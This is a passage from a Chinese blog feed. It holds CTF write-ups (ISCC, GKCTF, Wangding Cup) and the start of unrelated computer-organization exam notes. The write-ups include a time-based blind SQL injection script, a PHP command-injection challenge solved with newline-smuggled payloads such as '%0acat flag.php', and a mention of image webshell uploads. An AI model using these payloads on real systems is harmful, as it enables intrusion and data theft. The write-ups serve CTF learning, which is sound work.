class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        char=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">            payloads=payload.format(i,ord(j))</span><br><span class="line">            urls=url+<span class="string">&quot;?name=&quot;</span>+payloads+<span class="string">&quot;&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span></span><br><span class="line">            t1=datetime.datetime.now()</span><br><span class="line">            r=requests.get(url=urls)</span><br><span class="line">            t2=datetime.datetime.now()</span><br><span class="line">            sec = (t2 - t1).seconds</span><br><span class="line">            <span class="keyword">if</span> sec&gt;=<span class="number">3</span>:</span><br><span class="line">                name+=j</span><br><span class="line">                print(name)</span><br><span class="line">                char=j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这个脚本是原来的用<code>/**/</code>代替空格，用<code>%23</code>代替<code>#</code>的脚本。可以得到<br><img src="https://img-blog.csdnimg.cn/20200523113909849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>MD5 解密就可以了。<br><img src="https://img-blog.csdnimg.cn/20200523122413706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>关于mysql注入的知识<a href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#">大佬博客学习学习</a></p><h2 id="ISCC成绩查询-3"><a href="#ISCC成绩查询-3" class="headerlink" title="ISCC成绩查询_3"></a>ISCC成绩查询_3</h2><p><img src="https://img-blog.csdnimg.cn/20200523125740139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200523130007303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后f12查看一下，<br><img src="https://img-blog.csdnimg.cn/20200523130127580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不得不说，藏得真深，差点找不到。<br>意思是一个加密的函数，传入data和key然后将key进行MD5加密，再用strlen得出data和key的长度数值。<br>然后使用一个for循环将key(MD5加密后的)截取成和data的长度相同的，赋值给一个变量<code>$char</code>。再使用一个for循环</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让(原文每个字符+密钥对应每个字符)%<span class="number">256</span>得到密文，赋值给变量str</span><br></pre></td></tr></table></figure><p>最后<code>$str</code>进行base64加密后，返回。<br>先解出key的md5，即是密钥<br>然后对data进行base64解码得到密文<br>密文每个字符-密钥，如果&lt;0再加256；否则不用加<br>得到flag<br>用学长的解密脚本。<br>密钥也就是key上一题的flag，就是666。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$data, $key</span>)</span>&#123;</span><br><span class="line">$key = md5($key);</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$data = base64_decode($data);</span><br><span class="line">$len = strlen($data);</span><br><span class="line">$l = strlen($key);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l)&#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= substr($key, $x, <span class="number">1</span>);</span><br><span class="line">$x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span> (ord(substr($data, $i, <span class="number">1</span>)) &lt; ord(substr($char, $i, <span class="number">1</span>)))&#123;</span><br><span class="line">$str .= chr((ord(substr($data, $i, <span class="number">1</span>)) + <span class="number">256</span>) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$str .= chr(ord(substr($data, $i, <span class="number">1</span>)) - ord(substr($char, $i, <span class="number">1</span>)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">$data = <span class="string">&#x27;qKe4j6uFeqaTe5rVqqaXiKig25o=&#x27;</span>; <span class="comment">// 被加密信息</span></span><br><span class="line">$key = <span class="string">&#x27;666&#x27;</span>; <span class="comment">// 密钥</span></span><br><span class="line">$decrypt = decrypt($data, $key);</span><br><span class="line"><span class="keyword">echo</span> $decrypt;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202005231344566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>得到flag，复现完成。</p><h2 id="What-can-images-do"><a href="#What-can-images-do" class="headerlink" title="What can images do"></a>What can images do</h2><p>这个我做的时候已经上传不了任何东西了，最普通的图片都传不了，题目被人搞了。不过看学长的博客，这个是最简单的传图片马，利用文件包含漏洞用蚁剑连接就行了。与那种靶场差不多的。</p><h2 id="阿帅的爱情"><a href="#阿帅的爱情" class="headerlink" title="阿帅的爱情"></a>阿帅的爱情</h2><p><img src="https://img-blog.csdnimg.cn/20200523140307725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>PHP代码审计和命令执行漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ip&quot;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $ip=$_GET[<span class="string">&quot;ip&quot;</span>];</span><br><span class="line">    $pattern=<span class="string">&quot;/[;|&amp;].*[a-zA-Z]+/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$ip)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bad domain&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $result = shell_exec(<span class="string">&#x27;ping -c 4 &#x27;</span> . $ip);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">        $result = $e-&gt;getMessage();</span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    $result = str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br&gt;&quot;</span>, $result);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个命令执行漏洞我前段时间刚学过，但是只了解皮毛，没有去找相关的题进行实验，所以这道题也没有做出来。<br>这个看出来是可以当作ping来使用的。而且样式是linux系统中的ping方式，需要设置参数控制发包次数。<br><img src="https://img-blog.csdnimg.cn/20200523140658855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以执行一些终端命令<br>方法是进行绕过:<a href="https://www.freebuf.com/articles/web/137923.html">参考文章</a><br>使用<code>%0a</code>绕过</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>als</span><br><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>%<span class="number">0</span>acat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200523141151886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>使用cat命令查看flag.php当中的内容。<br><img src="https://img-blog.csdnimg.cn/20200523141245609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>害，其实挺简单的。</p><h2 id="Where-is-file"><a href="#Where-is-file" class="headerlink" title="Where is file?"></a>Where is file?</h2><p>题被搞坏了，emmm 就是PHP伪协议。</p><h1 id="GKCTF-Misc"><a href="#GKCTF-Misc" class="headerlink" title="GKCTF Misc"></a>GKCTF Misc</h1><p>签到直接看视频。</p><h2 id="GKCTF2020-Pokémon"><a href="#GKCTF2020-Pokémon" class="headerlink" title="[GKCTF2020]Pokémon"></a>[GKCTF2020]Pokémon</h2><p>玩游戏，在虚拟机里下载了个模拟器，然后开始玩。我还在网上找到通关教程。真是太惨了。去百度个通关教程——<a href="https://wenku.baidu.com/view/ea843c7103768e9951e79b89680203d8ce2f6ada.html">传送门</a><br>然后闯到103道路会看到flag，不过我到那里三次才看出来。原本一直在找女主，真是傻了。还他喵的死了好几次。看下时间用了将近一个小时。枯了。<br><img src="https://img-blog.csdnimg.cn/2020052411031060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>跑完全图就行了。注意为了节省时间，别穿草丛，说不定(很大几率，几乎可以说一定)会碰到怪兽，然后就要跟他打。费时间(都是眼泪)。<br>还有一点要注意的就是<br><img src="https://img-blog.csdnimg.cn/20200524110559639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>别碰他俩bt，他俩的怪兽都是15级，完全打不过。见了这俩请绕道走。不然还不能逃，就要重新来了。</p><h1 id="GKCTF-密码学"><a href="#GKCTF-密码学" class="headerlink" title="GKCTF 密码学"></a>GKCTF 密码学</h1><h2 id="GKCTF2020-小学生的密码学"><a href="#GKCTF2020-小学生的密码学" class="headerlink" title="[GKCTF2020]小学生的密码学"></a>[GKCTF2020]小学生的密码学</h2><p>仿射密码<br><img src="https://img-blog.csdnimg.cn/20200524134125857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>再进行base64加密就行了。</p><h1 id="2020网鼎杯——青龙组部分题目复现"><a href="#2020网鼎杯——青龙组部分题目复现" class="headerlink" title="2020网鼎杯——青龙组部分题目复现"></a>2020网鼎杯——青龙组部分题目复现</h1><h2 id="签到题-1"><a href="#签到题-1" class="headerlink" title="签到题"></a>签到题</h2><p>这个没有环境了，链接挂了。所以记录下思路<br>点开链接进行战队猜猜猜，15关猜图，全猜对弹出框，然后输入战队token，f12进入控制台可以找到flag。啥也没有了。留下张图做个纪念哈哈<br><img src="https://img-blog.csdnimg.cn/20200511235131426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h2><p><img src="https://img-blog.csdnimg.cn/20200511235210711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>一个exe程序，打开是做三道题：<br>第一个，解MD5字符串，直接在线网站解就行了。<br><img src="https://img-blog.csdnimg.cn/20200511233455838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>第二个，解个简单的三元一次方程组<br><img src="https://img-blog.csdnimg.cn/20200511233714921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>第三个：解一个一元一次方程组<br>可以使用python写简单的几行代码，使用sqrt函数开方一下。<br>还可以在线网站解：<a href="http://www.99cankao.com/algebra/quadratic-equation.php">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200511234845969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200511233855961.png" alt="j4y" loading="lazy"><br>然后发现程序直接关闭了，还是没有看到flag<br>所以就打开cmd，到目标目录下，运行<code>boom.exe</code>，将答案再填写一遍。<br><img src="https://img-blog.csdnimg.cn/20200511234237925.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>得到flag。</p><p>参考链接：<br>我的不全，只有几道题。学长整理的比较多——ISCCweb题解：<a href="https://blog.csdn.net/qq_43431158/article/details/106160356">Lemon</a></p><p>文末寄语：</p><blockquote><p>没人能挽留你在这个世界，就像没人能阻止你来到这个世界。如果非要说害怕什么，我只是害怕上帝丢给我太多理想，却忘了给我完成理想的时间。<br>——《站在两个世界的边缘》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理期末复习(基础)</title>
      <link href="/2020/08/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%89/"/>
      <url>/2020/08/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>前言：快要期末考试了，划水整学期的我说不慌那是假的，本学期非常有纪念意义，在家度过整个学期。废话不多说啦，肝！开始复习！<br><img src="https://img-blog.csdnimg.cn/20200520224244171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h1 id="冯诺依曼计算机特点"><a href="#冯诺依曼计算机特点" class="headerlink" title="冯诺依曼计算机特点"></a>冯诺依曼计算机特点</h1><p>1.计算机由运算器、存储器、控制器、输入输出设备五大部件组成<br>2.指令和数据以同等地位存放于存储器内，并可按地址寻访。<br>3.指令和数据均用二进制数表示。<br>4.指令由操作码和地址码组成。操作码用来表示操作的性质，地址码用来表示操作数在存储器中的位置。<br>5.指令在存储器内按顺序存放。通常，指令是按顺序执行的，在特定条件下，可根据运算结果或根据设定的条件改变执行顺序。<br>6.机器以运算器为中心，输入输出设备与存储器间的数据传递通过运算器完成。<br><img src="https://img-blog.csdnimg.cn/20200520224747990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>各部件的功能：<br>运算器：用来完成算数运算和逻辑运算，并将运算的中间结果暂存在运算器内。<br>存储器：用来存放数据和程序 。<br>控制器：用来控制、指挥程序和数据的输入、运行以及处理运算结果。<br>输入设备：用来将人们熟悉的信息形式转换为机器能识别的信息形式，常见的有键盘、鼠标等。<br>输出设备：可将机器运算结果转换为人们熟悉的信息形式，如打印机输出，显示器输出等。<br><img src="https://img-blog.csdnimg.cn/20200520224835230.png" alt="j4y" loading="lazy"><br>主存储器是存储器子系统中的一类用来存放程序和数据，可以直接与CPU交换信息。另一类称为辅助存储器，简称辅存，又称外存。<br>算术逻辑单元（ALU）简称算辑部件，用来完成算术逻辑运算。控制单元（CU）用来用来解释存储器的指令，并发出各种操作命令来执行指令。ALU和CU是CPU 的核心部件。<br>I/O设备也受CU控制、用来完成相应的输入、输出操作。</p><p>计算机的工作过程：<br><img src="https://img-blog.csdnimg.cn/20200520224911184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>（1）主存储器：简称主存或内存。包括存储体M、各种逻辑部件及控制电路等。存储体有许多存储的单元组成，每个存储单元又包含若干个存储元件（或称存储基元、存储元。）寄存器：为了能实现按地址访问的方式，主存中还必须配置两个寄存器MAR和MDR。MAR是存储器地址寄存器，用来存放域访问的存储的单元的地址，其位数对应存储单元的个数，（如MAR为10位，则有 ）MDR是存储器数据寄存器，用来存放从存储体某单元取出的代码或者准备往某存储单元存入的代码，其位数与存储字长相等<br>（2）运算器：运算器最少包括3个寄存器和一个算术逻辑单元（ALU）其中ACC为累加器MQ为乘商寄存器，X为操作数寄存器，这3个寄存器在完成不同运算时，所存放的操作数 类别也各不相同。<br><img src="https://img-blog.csdnimg.cn/20200520224948243.png" alt="j4y" loading="lazy"><br>M表示存储器的任意地址号，[M]表示对应M地址号单元中的内容；X表示X寄存器，[X]表示X寄存器中的内容；ACC表示累加器，[ACC]表示累加器中的内容；MQ表示乘商寄存器，[MQ]表示乘商寄存器中的内容。</p><h1 id="简答题型"><a href="#简答题型" class="headerlink" title="简答题型"></a>简答题型</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这些简答题是我在学习过这位博主小姐姐的文章后做得笔记。原文传送门——<a href="https://blog.csdn.net/qq_41587612/article/details/96769076">计算机组成原理超实用</a><br>简答题：</p><ol><li>影响流水线性能的主要因素有哪几种？请简要加以说明。<pre><code> 结构相关：是当多条指令进入流水线后，硬件资源满足不了指令重叠执行的要求时产生的，不同指令争用同一功能部件产生资源冲突。 数据相关：是指令在流水线中重叠执行时，当后继指令需要用到前面指令的执行结果时发生的。可能改变对操作数的读写访问顺序。 控制相关：是当流水线遇到分支指令和其他改变PC值的指令时引起的。</code></pre></li><li>为了保证DRAM(动态随机存储器)的存储信息不遭破坏，必须在电荷漏掉前就进行充电，称为刷新。常见的刷新方式有哪三种，试分析它们间的区别。<pre><code> 集中刷新：是在规定的一个刷新周期内，对全部存储单元集中一段时间逐行(hang)进行刷新，此刻必须停止读/写操作。 分散刷新：是指对每行存储单元的刷新分散到每个存储周期内完成。 异步刷新：是前两种方式的结合，既可缩短“死时间”，又充分利用最大刷新间隔2ms的特点。</code></pre></li><li>说明计算机九大寻址方式及有效地址EA计算方法。<pre><code> 立即寻址：无需寻址        隐含寻址：无需寻址       直接寻址：EA=A        间接寻址：EA=(A)         相对寻址：EA=(PC)+A 基址寻址：EA=(BR)+A    变址寻址：EA=(IX)+A    寄存器寻址：EA=Rj    寄存器间接寻址：EA=(Rj)</code></pre></li><li>按传输信息的不同，系统总线可分为哪几类？并加以简单描述。<pre><code> 数据总线：用来传输各种功能部件间的数据信息，是双向传输总线，其位数与机器字长、存储字长有关，一般为8/16/32位。 地址总线：主要用来指出数据总线上的源数据或目的数据在主存单元的地址或I/O设备的地址。 控制总线：用来发送各种控制信号的传输线，通常对任意控制线而言，它的传输是单向的。</code></pre></li><li>试说明具有Cache-主存结构的计算机，CPU在访问存储器时的工作流程。    <pre><code> CPU欲读取主存某字时，有两种可能：一种是所需要的字已经在缓存中，即可直接访问Cache；另一种是所需的字不在Cache内，此时需将该字所在的主存整个字块一次调入Cache中（Cache与主存之间是字块传输)。当Cache未满时，主存块可被调入缓存块中，称该主存块与缓存块建立了联系。当Cache已满时，无法接收来自主存块的信息，就由Cache内的替换机构按一定的算法从Cache内移除哪块返回主存，并把新的主存块调入Cache中。</code></pre></li><li>在写操作时，要考虑Cache和主存的数据一致性的问题，试说明写回法和写直达法的区别。    <pre><code> 写回法（拷回法）：写操作时只把数据写入Cache而不写入主存（减少了主存的写操作次数），写操作时间=访Cache时间。但当（读操作且Cache已满时）Cache数据被替换出来时才写回主存，增加了Cache复杂性。 写直达法（存直达法）：写操作时数据既写入Cache又写入主存，写操作时间=访存时间，它能随时保证主存与Cache的数据始终一致，但增加了访存次数。（读操作时不涉及对主存的写操作，更新策划较容易实现。）</code></pre></li><li>说明补码定点加减运算，判断溢出的两种方法。    <pre><code> 一位符号位判断溢出：参加操作的两个数（减法时即为被减数和“求补”后的减数）符号相同，其结果的符号与原操作数的符号不同，即为溢出。 两位符号位判断溢出：若结果双符号位相同，则未溢出；若双符号位不同，则溢出。最高符号位为真结果符号。</code></pre></li><li>说明Cache-主存的地址映像有哪三种方式，说明他们的基本映像原理。<pre><code> 直接映射：将主存空间按Cache的尺寸分区，每区内相同的块号映像到Cache中相同的块位置。优：实现简单；缺：不够灵活 全相连映射：主存中的每一个字块可映射到Cache任何一个字块位置上，当访问一个块中的数据时，块地址要与Cache块表中的所有地址标记进行比较以确认是否命中。 组相连映射：是直接映射和全相连映射的一种折中方案，这种方案将存储空间分为若干组，各组间是直接映射，而组内各块间是全相连映射。</code></pre></li><li>试说明指令周期，机器周期，时钟周期之间的关系。    <pre><code> 一个指令周期包含若干个机器周期，一个机器周期又包含若干个时钟周期（节拍），每个指令周期内的机器周期数可以不等，每个机器周期内的节拍数也可以不等。</code></pre></li><li>试说明单译码方式（线选法）和双译码方式（重合法）的区别。    <pre><code>存储芯片内的地址译码器有两种方式：一种是线选法，适用于地址线较少的芯片。地址信号只需经过一个方向的译码器就可以选中某一存储单元的所有位，结构较简单。另一种是重合法，适用于地址线较多的芯片。地址线分为两组，分别经行地址译码器和列地址译码器，通过两者“与”选中存储单元才能进行读/写。</code></pre></li><li>分别说明一下名词MAR，MDR，CU，IR，PC的中文名称及该器件的主要功能。<pre><code>MAR是存储器地址寄存器，用来存放欲访问的存储单元的地址，其位数对应存储单元的个数。MDR是存储器数据寄存器，用来存放从存储体某单元取出or存入的代码，其位数与存储字长相等。CU是控制单元，用来分析当前指令所需完成的操作，并发出各种微操作命令序列，用以控制所有被控对象。IR是指令寄存器，用来存放当前指令，IR的内容来自MDR。PC是程序计数器，用来存放当前欲执行指令的地址，它与主存的MAR间有一条直接通道且具有自动加1功能，即可自动形成下一条指令的地址。</code></pre></li><li>计算机的五大基本组成是什么？<pre><code>运算器：用来完成算术运算和逻辑运算，并将运算的中间结果暂存在运算器里。存储器：用来存放数据和程序。控制器：用来控制、指挥程序和数据的输入、运行以及处理运算的结果。输入设备：用来将人们熟悉的信息形式转换为机器能识别的信息形式，常见的有键盘、鼠标等。输出设备：可将机器运算结果转换为人们熟悉的信息形式，如打印机输出等。</code></pre></li><li>设某计算机采用微程序控制器，试说明微程序控制器的基本工作原理（即CPU执行指令时的操作过程）。<pre><code>首先将用户程序的首地址送到PC，然后进入取指阶段：        ①将取指周期微程序首地址M→CMAR        ②取微指令：将对应控存M地址单元中的第一条微指令读到控存数据寄存器中，记为`CM(CMAR)→CMDR`                        ③产生微操作指令：第一条微指令的操作控制字段中为“1”的各位发出控制信号，如PC→MAR、I→R，命令主存    接收程序首地址并进行读操作。        ④形成下一条微指令的地址：此微指令的顺序控制字段指出了下一条微指令的地址为M+1，将M+1送至CMAR，即`Ad(CMDR)→CMAR`        ⑤取下一条微指令：将对应控存M+1地址单元中的第二条微指令读到CMDR中，即`CM(CMAR)→CMDR`        ⑥产生微操作指令：由第二条微指令的操作控制字段中对应“1”的各位发出控制信号，如M(MAR)→MDR使对应主存2000H地址单元中的第一条机器指令从主存中读出，送至MDR中。        ⑦形成下一条微指令地址：将第二条微指令下地址字段指出的地址M+2送至CMAR，即`Ad(CMDR)→CMAR`执行阶段：        ①取数指令微程序首地址的形成：当取数指令存入IR后，其操作码OP(IR)直接送到微地址形成部件，该部件的输出即为取数指令微程序的首地址P，且将P送至CMAR，记作OP(IR)→微地址形成部件→CMAR        ②取微指令：将对应控存P地址单元中的微指令读到CMDR中，记为`CM(CMAR)→CMDR`        ③产生为操作命令：由微指令操作控制字段中对应“1”的各位发出控制信号，如Ad(IR)→MAR、I→R，命令主存读操作数。        ④形成下一条微指令地址：将此条微指令下地址字段指出的P+1送至CMAR，即`Ad(CMDR)→CMAR`</code></pre></li><li>试说明汉明码的校验原理（即如何生成汉明码，以及汉明码的检验原理），默认偶校验。<pre><code>汉明码的生成步骤：①确定校验位的位数 `2^k ≥ n + k +1`                  ②确定校验位的位置                  ③分组                  ④生成校验位的值                  ⑤得出结论检验原理：将已知的汉明码按照前三步正常进行，到第四步时，用H接收P和D一起异或，然后把H倒序排列，若都为0，即无错。否则，该序列对应的二进制位置出错。</code></pre></li><li>试说明循环冗余校验码的校验原理。<pre><code>循环冗余校验码的生成步骤：①确定校验位的位数 r                          ②写出信息多项式 `M(x)`                          ③将信息多项式左移 r 位，得到 `M(x)·x^r`                          ④用 `M(x)·x^r` 除以生成多项式 G(x)，得到 r 位校验位                          ⑤`M(x)·x^r+R(x)` 得到CRC码检验原理：根据余数判出错位，取反纠错。</code></pre><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2></li></ol><h1 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h1><p>先复习下正数和负数的原码、补码、反码怎么写。<br>正数的原码、补码和反码都是一样的。<br>比如：+7<br>数值 (原码)<code>0,0000111</code>最前面的是符号位，正数是0，负数是1<br>则+7的补码为<code>0,0000111</code>、反码为<code>0,0000111</code><br>负数  -7<br>数值(原码)<code>1,0000111</code>符号位是1<br>则-7的反码<code>1,1111000</code> （负数的反码与原码符号位相同，数值为取反）<br>补码<code>1,1111001</code> （负数的补码是在反码的基础上加1，）</p><h2 